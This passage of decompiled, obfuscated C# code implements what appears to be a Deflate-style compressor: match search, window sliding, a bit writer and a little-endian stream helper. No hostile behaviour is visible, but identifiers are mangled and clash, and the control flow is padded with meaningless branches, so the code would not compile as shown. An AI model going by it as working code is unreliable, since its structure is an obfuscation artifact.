        int maxValue = (int) this.\u003F8\u003F[this.\u003F92\u003F + 2];
        if (true)
          goto label_2;
label_1:
        return num1 & maxValue;
label_2:
        int index = (num1 ^ maxValue) & (int) short.MaxValue;
        short num2;
        this.\u003F1\u003F[this.\u003F92\u003F & (int) short.MaxValue] = num2 = this.\u003F8\u003F[index];
        if (true)
        {
          this.\u003F8\u003F[index] = (short) this.\u003F92\u003F;
          this.\u003F23\u003F = index;
          int num3 = (int) num2;
          maxValue = (int) ushort.MaxValue;
          num1 = num3;
          goto label_1;
        }
        else
          goto label_0;
      }

      private void \u003F1\u003F()
      {
        if (false)
          goto label_10;
        else
          goto label_8;
label_1:
        int num1;
        int num2;
        int num3 = num1 & num2;
        goto label_10;
label_2:
        int index1;
        int num4;
        int num5;
        if (num5 != 0)
          index1 = num4 + num5;
        else
          goto label_15;
label_3:
        int num6 = index1;
        int num7;
        while (true)
        {
          if (num6 < 32768)
          {
            num7 = (int) this.\u003F8\u003F[index1];
            if (false)
              num6 = num7;
            else
              goto label_11;
          }
          else
            break;
        }
        int index2 = 0;
        goto label_7;
label_11:
        num2 = (int) ushort.MaxValue;
        num1 = num7;
        goto label_1;
label_7:
        int num8 = index2;
        num5 = 32768;
        num4 = num8;
        goto label_15;
label_8:
        Array.Copy((Array) this.\u003F8\u003F, 32768, (Array) this.\u003F8\u003F, 0, 32768);
        this.\u003F24\u003F -= 32768;
        this.\u003F92\u003F -= 32768;
        this.\u003F26\u003F -= 32768;
        index1 = 0;
        goto label_3;
label_10:
        this.\u003F8\u003F[index1] = num3 >= 32768 ? (short) (num3 - 32768) : (short) 0;
        num4 = index1;
        num5 = 1;
        goto label_2;
label_15:
        if (num4 >= num5)
          return;
        int num9 = (int) this.\u003F1\u003F[index2];
        int maxValue = (int) ushort.MaxValue;
        if (maxValue == 0)
        {
          num5 = maxValue;
          num4 = num9;
          goto label_2;
        }
        else
        {
          int num10 = num9 & maxValue;
          this.\u003F1\u003F[index2] = num10 >= 32768 ? (short) (num10 - 32768) : (short) 0;
          num1 = index2;
          num2 = 1;
          if (num2 != 0)
          {
            index2 = num1 + num2;
            goto label_7;
          }
          else
            goto label_1;
        }
      }

      public void \u003F2\u003F()
      {
label_0:
        int num1 = this.\u003F92\u003F;
        int num2 = 65274;
        if (num2 == 0)
          goto label_15;
        else
          goto label_9;
label_3:
        int length;
        this.\u003F95\u003F += length;
        this.\u003F94\u003F += length;
label_4:
        if (this.\u003F94\u003F >= 262)
          goto label_6;
label_5:
        int num3 = this.\u003F96\u003F;
        if (true)
        {
          num2 = this.\u003F97\u003F;
          num1 = num3;
          goto label_15;
        }
        else
          goto label_8;
label_6:
        if (true)
        {
          if (this.\u003F94\u003F < 3)
            return;
          this.\u003F8\u003F();
          return;
        }
        goto label_5;
label_8:
        length = num3;
        if (length > this.\u003F97\u003F - this.\u003F96\u003F)
          goto label_11;
label_2:
        Array.Copy((Array) this.\u003F1\u003F, this.\u003F96\u003F, (Array) this.\u003F8\u003F, this.\u003F92\u003F + this.\u003F94\u003F, length);
        if (true)
        {
          this.\u003F96\u003F += length;
          goto label_3;
        }
        else
          goto label_0;
label_11:
        int num4 = this.\u003F97\u003F;
        int num5 = this.\u003F96\u003F;
        if (true)
        {
          length = num4 - num5;
          goto label_2;
        }
        else
        {
          num2 = num5;
          num1 = num4;
          goto label_15;
        }
label_9:
        if (num1 >= num2)
        {
          this.\u003F1\u003F();
          goto label_4;
        }
        else
          goto label_4;
label_15:
        if (num1 < num2)
        {
          if (true)
          {
            num3 = 65536 - this.\u003F94\u003F - this.\u003F92\u003F;
            goto label_8;
          }
          else
            goto label_3;
        }
        else
          goto label_6;
      }

      private bool \u003F8\u003F(int _param1)
      {
        int num1 = 128;
        if (false)
          goto label_8;
        else
          goto label_14;
label_2:
        int val1;
        byte num2;
        byte num3;
        int index1;
        if ((int) this.\u003F8\u003F[_param1 + val1] != (int) num3 || (int) this.\u003F8\u003F[_param1 + val1 - 1] != (int) num2 || (int) this.\u003F8\u003F[_param1] != (int) this.\u003F8\u003F[index1] || (int) this.\u003F8\u003F[_param1 + 1] != (int) this.\u003F8\u003F[index1 + 1])
          goto label_11;
label_3:
        int num4 = _param1 + 2;
label_4:
        int num5 = num4;
        index1 += 2;
label_5:
        if (true)
        {
          byte[] numArray1 = this.\u003F8\u003F;
          int num6 = index1;
          int index2;
          index1 = index2 = num6 + 1;
          if ((int) numArray1[index2] == (int) this.\u003F8\u003F[++num5] && (int) this.\u003F8\u003F[++index1] == (int) this.\u003F8\u003F[++num5])
          {
            byte[] numArray2 = this.\u003F8\u003F;
            int num7 = index1;
            int index3;
            index1 = index3 = num7 + 1;
            int num8 = (int) numArray2[index3];
            int num9;
            for (int index4 = (int) this.\u003F8\u003F[++num5]; num8 == index4 && (int) this.\u003F8\u003F[++index1] == (int) this.\u003F8\u003F[++num5] && (int) this.\u003F8\u003F[++index1] == (int) this.\u003F8\u003F[++num5] && (int) this.\u003F8\u003F[++index1] == (int) this.\u003F8\u003F[++num5]; num8 = num9)
            {
              num9 = (int) this.\u003F8\u003F[++index1];
              int num10 = (int) this.\u003F8\u003F[++num5];
              if (false)
              {
                index4 = num10;
              }
              else
              {
                if (num9 != num10 || (int) this.\u003F8\u003F[++index1] != (int) this.\u003F8\u003F[++num5])
                  break;
                goto label_6;
              }
            }
            goto label_7;
          }
          else
            goto label_7;
        }
        else
          goto label_3;
label_6:
        int num11;
        if (index1 < num11)
          goto label_5;
label_7:
        int index5;
        if (index1 > index5)
          this.\u003F24\u003F = _param1;
        else
          goto label_10;
label_8:
        index5 = index1;
        val1 = index1 - this.\u003F92\u003F;
        int num12;
        if (val1 >= num12)
          goto label_12;
label_9:
        num2 = this.\u003F8\u003F[index5 - 1];
        num3 = this.\u003F8\u003F[index5];
label_10:
        index1 = this.\u003F92\u003F;
label_11:
        short[] numArray;
        int num13;
        _param1 = num13 = (int) numArray[_param1 & (int) short.MaxValue] & (int) ushort.MaxValue;
        int num14;
        int num15 = num14;
        if (true)
        {
          if (num13 > num15)
          {
            if (true)
            {
              if (--num1 != 0)
                goto label_2;
            }
            else
              goto label_6;
          }
        }
        else
          goto label_17;
label_12:
        while (true)
        {
          this.\u003F25\u003F = Math.Min(val1, this.\u003F94\u003F);
          if (true)
            return this.\u003F25\u003F >= 3;
        }
        goto label_9;
label_14:
        num12 = 128;
        numArray = this.\u003F1\u003F;
        index1 = this.\u003F92\u003F;
        index5 = this.\u003F92\u003F + this.\u003F25\u003F;
        val1 = Math.Max(this.\u003F25\u003F, 2);
        num14 = Math.Max(this.\u003F92\u003F - 32506, 0);
        num11 = this.\u003F92\u003F + 258 - 1;
        num2 = this.\u003F8\u003F[index5 - 1];
        num3 = this.\u003F8\u003F[index5];
        int num16 = val1;
        if (false)
        {
          num4 = num16;
          goto label_4;
        }
        else
        {
          if (num16 >= 8)
            goto label_16;
label_1:
          int num17 = num12;
          num15 = this.\u003F94\u003F;
          num13 = num17;
          goto label_17;
label_16:
          num1 >>= 2;
          goto label_1;
        }
label_17:
        if (num13 > num15)
        {
          num12 = this.\u003F94\u003F;
          goto label_2;
        }
        else
          goto label_2;
      }

      private bool \u003F8\u003F(bool _param1, bool _param2)
      {
        if (this.\u003F94\u003F < 262 && !_param1)
          return false;
label_17:
        int num1 = this.\u003F94\u003F;
        int num2 = 262;
        if (num2 == 0)
          goto label_34;
        else
          goto label_43;
label_2:
        int num3 = 65274;
        int num4;
        int num5;
        int num6;
        int num7;
        int num8;
        if (num3 != 0)
        {
          if (num8 >= num3)
            goto label_24;
label_3:
          num4 = this.\u003F24\u003F;
          num5 = this.\u003F25\u003F;
          if (this.\u003F94\u003F >= 3)
          {
            num6 = this.\u003F8\u003F();
            if (num6 != 0)
            {
              num7 = this.\u003F92\u003F;
              goto label_4;
            }
            else
              goto label_6;
          }
          else
            goto label_6;
label_24:
          this.\u003F1\u003F();
          goto label_3;
        }
        else
          goto label_14;
label_4:
        int num9 = num6;
        int num10;
        if (num7 - num9 <= 32506 && this.\u003F8\u003F(num6) && this.\u003F25\u003F <= 5)
          num10 = this.\u003F25\u003F;
        else
          goto label_6;
label_5:
        if (num10 == 3 && this.\u003F92\u003F - this.\u003F24\u003F > 4096)
        {
          if (true)
            this.\u003F25\u003F = 2;
          else
            goto label_12;
        }
label_6:
        int num11 = num5;
        int num12 = 3;
        int num13;
        int num14;
        if (num12 == 0)
        {
          num14 = num12;
          num13 = num11;
          goto label_9;
        }
        else if (num11 < num12 || this.\u003F25\u003F > num5)
        {
          if (this.\u003F8\u003F)
            goto label_36;
label_11:
          this.\u003F8\u003F = true;
          ++this.\u003F92\u003F;
          --this.\u003F94\u003F;
          goto label_12;
label_36:
          this.\u003F8\u003F.\u003F8\u003F((int) this.\u003F8\u003F[this.\u003F92\u003F - 1] & (int) byte.MaxValue);
          goto label_11;
        }
        else
        {
          this.\u003F8\u003F.\u003F8\u003F(this.\u003F92\u003F - 1 - num4, num5);
          num5 -= 2;
        }
label_7:
        ++this.\u003F92\u003F;
        --this.\u003F94\u003F;
        if (this.\u003F94\u003F >= 3)
          goto label_32;
label_8:
        num13 = num5;
        num14 = 1;
        goto label_9;
label_32:
        this.\u003F8\u003F();
        goto label_8;
label_9:
        num5 = num10 = num13 - num14;
        if (true)
        {
          num2 = 0;
          num1 = num10;
          goto label_34;
        }
        else
          goto label_5;
label_12:
        int num15;
        if (this.\u003F8\u003F.\u003F8\u003F())
        {
          num7 = this.\u003F92\u003F - this.\u003F26\u003F;
          if (true)
          {
            num15 = num7;
            num8 = this.\u003F8\u003F ? 1 : 0;
            if (true)
            {
              if (num8 != 0)
                goto label_40;
label_13:
              if (!_param2 || this.\u003F94\u003F != 0)
              {
                num7 = 0;
                goto label_16;
              }
              else
              {
                int num16 = this.\u003F8\u003F ? 1 : 0;
                num3 = 0;
                num8 = num16;
                goto label_14;
              }
label_40:
              --num15;
              goto label_13;
            }
            else
              goto label_2;
          }
          else
            goto label_16;
        }
        else
          goto label_17;
label_14:
        num7 = num8 == num3 ? 1 : 0;
label_16:
        if (true)
        {
          bool flag = num7 != 0;
          this.\u003F8\u003F.\u003F1\u003F(this.\u003F8\u003F, this.\u003F26\u003F, num15, flag);
          this.\u003F26\u003F += num15;
          return !flag;
        }
        goto label_4;
label_34:
        if (num1 <= num2)
        {
          ++this.\u003F92\u003F;
          --this.\u003F94\u003F;
          this.\u003F8\u003F = false;
          this.\u003F25\u003F = 2;
          goto label_12;
        }
        else
          goto label_7;
label_43:
        if (num1 < num2 && !_param1)
          return true;
        if (this.\u003F94\u003F != 0)
        {
          num8 = this.\u003F92\u003F;
          goto label_2;
        }
        else
        {
          if (this.\u003F8\u003F)
            this.\u003F8\u003F.\u003F8\u003F((int) this.\u003F8\u003F[this.\u003F92\u003F - 1] & (int) byte.MaxValue);
          this.\u003F8\u003F = false;
          this.\u003F8\u003F.\u003F1\u003F(this.\u003F8\u003F, this.\u003F26\u003F, this.\u003F92\u003F - this.\u003F26\u003F, _param2);
          this.\u003F26\u003F = this.\u003F92\u003F;
          return false;
        }
      }

      public bool \u003F1\u003F(bool _param1, bool _param2)
      {
        bool flag1;
        do
        {
          this.\u003F2\u003F();
          int num = _param1 ? 1 : 0;
          if (true)
            goto label_9;
label_2:
          if (true)
            goto label_7;
label_3:
          flag1 = num != 0;
label_4:
          continue;
label_7:
          bool flag2 = num != 0;
          if (true)
          {
            if (true)
            {
              num = this.\u003F8\u003F(flag2, _param2) ? 1 : 0;
              goto label_3;
            }
          }
          else
            goto label_4;
label_6:
          num = this.\u003F96\u003F == this.\u003F97\u003F ? 1 : 0;
          goto label_2;
label_9:
          if (num == 0)
          {
            if (true)
            {
              num = 0;
              goto label_2;
            }
          }
          else
            goto label_6;
        }
        while (this.\u003F8\u003F.IsFlushed && flag1);
        return flag1;
      }

      public void \u003F8\u003F(byte[] _param1)
      {
        if (true)
          this.\u003F1\u003F = _param1;
        do
        {
          this.\u003F96\u003F = 0;
          this.\u003F97\u003F = _param1.Length;
        }
        while (false);
      }

      public bool \u003F8\u003F() => this.\u003F97\u003F == this.\u003F96\u003F;
    }

    internal sealed class \u003F6\u003F
    {
      protected byte[] \u003F8\u003F = new byte[65536];
      private int \u003F8\u003F = 0;
      private int \u003F1\u003F = 0;
      private uint \u003F8\u003F = 0;
      private int \u003F2\u003F = 0;

      public void \u003F8\u003F(int _param1)
      {
        byte[] numArray1 = this.\u003F8\u003F;
        \u003F9\u003F.\u003F2\u003F.\u003F6\u003F obj1 = this;
        int num1;
        int num2 = num1 = obj1.\u003F1\u003F;
        obj1.\u003F1\u003F = num1 + 1;
        int index1 = num2;
        int num3 = (int) (byte) _param1;
        numArray1[index1] = (byte) num3;
        byte[] numArray2 = this.\u003F8\u003F;
        \u003F9\u003F.\u003F2\u003F.\u003F6\u003F obj2 = this;
        int num4;
        int num5 = num4 = obj2.\u003F1\u003F;
        obj2.\u003F1\u003F = num4 + 1;
        int index2 = num5;
        int num6 = (int) (byte) (_param1 >> 8);
        numArray2[index2] = (byte) num6;
      }

      public void \u003F8\u003F(byte[] _param1, int _param2, int _param3)
      {
label_0:
        Array.Copy((Array) _param1, _param2, (Array) this.\u003F8\u003F, this.\u003F1\u003F, _param3);
        do
        {
          if (true)
            this.\u003F1\u003F += _param3;
          else
            goto label_0;
        }
        while (false);
      }

      public int BitCount => this.\u003F2\u003F;

      public void \u003F8\u003F()
      {
        if (this.\u003F2\u003F > 0)
          goto label_2;
label_1:
        this.\u003F8\u003F = 0U;
        this.\u003F2\u003F = 0;
        return;
label_2:
        byte[] numArray1 = this.\u003F8\u003F;
        \u003F9\u003F.\u003F2\u003F.\u003F6\u003F obj1 = this;
        int num1;
        int num2 = num1 = obj1.\u003F1\u003F;
        obj1.\u003F1\u003F = num1 + 1;
        int index1 = num2;
        int num3 = (int) (byte) this.\u003F8\u003F;
        numArray1[index1] = (byte) num3;
        if (this.\u003F2\u003F > 8)
        {
          byte[] numArray2 = this.\u003F8\u003F;
          \u003F9\u003F.\u003F2\u003F.\u003F6\u003F obj2 = this;
          int num4;
          int num5 = num4 = obj2.\u003F1\u003F;
          obj2.\u003F1\u003F = num4 + 1;
          int index2 = num5;
          int num6 = (int) (byte) (this.\u003F8\u003F >> 8);
          numArray2[index2] = (byte) num6;
          goto label_1;
        }
        else
          goto label_1;
      }

      public void \u003F8\u003F(int _param1, int _param2)
      {
label_0:
        do
        {
          this.\u003F8\u003F |= (uint) (_param1 << this.\u003F2\u003F);
          this.\u003F2\u003F += _param2;
          if (this.\u003F2\u003F >= 16)
            goto label_3;
label_2:
          continue;
label_3:
          byte[] numArray = this.\u003F8\u003F;
          \u003F9\u003F.\u003F2\u003F.\u003F6\u003F obj = this;
          int num1;
          int num2 = num1 = obj.\u003F1\u003F;
          obj.\u003F1\u003F = num1 + 1;
          int index = num2;
          int num3 = (int) (byte) this.\u003F8\u003F;
          numArray[index] = (byte) num3;
          do
          {
            if (true)
            {
              this.\u003F8\u003F[this.\u003F1\u003F++] = (byte) (this.\u003F8\u003F >> 8);
              this.\u003F8\u003F >>= 16;
            }
            else
              goto label_0;
          }
          while (false);
          this.\u003F2\u003F -= 16;
          goto label_2;
        }
        while (false);
      }

      public bool IsFlushed => this.\u003F1\u003F == 0;

      public int \u003F8\u003F(byte[] _param1, int _param2, int _param3)
      {
        int num1 = this.\u003F2\u003F;
        int num2 = 8;
        int num3;
        int num4;
        while (true)
        {
          if (num1 >= num2)
          {
            byte[] numArray = this.\u003F8\u003F;
            \u003F9\u003F.\u003F2\u003F.\u003F6\u003F obj = this;
            int num5;
            int num6 = num5 = obj.\u003F1\u003F;
            obj.\u003F1\u003F = num5 + 1;
            int index = num6;
            int num7 = (int) (byte) this.\u003F8\u003F;
            numArray[index] = (byte) num7;
            if (true)
            {
              this.\u003F8\u003F >>= 8;
              this.\u003F2\u003F -= 8;
            }
            else
              goto label_2;
          }
          if (_param3 > this.\u003F1\u003F - this.\u003F8\u003F)
          {
            num3 = this.\u003F1\u003F;
            num4 = this.\u003F8\u003F;
            if (false)
            {
              num2 = num4;
              num1 = num3;
            }
            else
              goto label_8;
          }
          else
            break;
        }
        Array.Copy((Array) this.\u003F8\u003F, this.\u003F8\u003F, (Array) _param1, _param2, _param3);
        this.\u003F8\u003F += _param3;
label_2:
        return _param3;
label_8:
        _param3 = num3 - num4;
        Array.Copy((Array) this.\u003F8\u003F, this.\u003F8\u003F, (Array) _param1, _param2, _param3);
        this.\u003F8\u003F = 0;
        this.\u003F1\u003F = 0;
        goto label_2;
      }
    }

    internal sealed class \u003F7\u003F : MemoryStream
    {
      public void \u003F8\u003F(int _param1)
      {
        this.WriteByte((byte) (_param1 & (int) byte.MaxValue));
        this.WriteByte((byte) (_param1 >> 8 & (int) byte.MaxValue));
      }

      public void \u003F1\u003F(int _param1)
      {
        this.\u003F8\u003F(_param1);
        this.\u003F8\u003F(_param1 >> 16);
      }

      public int \u003F8\u003F() => this.ReadByte() | this.ReadByte() << 8;

      public int \u003F1\u003F() => this.\u003F8\u003F() | this.\u003F8\u003F() << 16;

      public \u003F7\u003F()
      {
      }

      public \u003F7\u003F(byte[] _param1)
        : base(_param1, false)
      {
      }
    }
  }
}
